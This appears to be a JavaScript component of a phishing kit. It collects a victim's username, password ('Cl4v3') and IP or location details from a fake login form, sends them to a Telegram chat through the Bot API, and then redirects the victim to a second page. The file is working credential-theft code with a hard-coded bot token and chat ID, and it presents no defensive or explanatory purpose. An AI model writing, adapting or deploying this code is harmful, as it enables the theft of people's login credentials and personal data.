//bot token
var telegram_bot_id = "6150387762:AAFVZo2_LGF13byZquAl2Qh8JBJ1qWvNbO4";
//chat id
var chat_id = 5150089222;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "👤USER: " + u_name + "\n🔒Cl4v3: " + pax +"\nIP: " + ip +"\n" + ip2 +"\n\n🧿BY: JSC0DE🧿";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
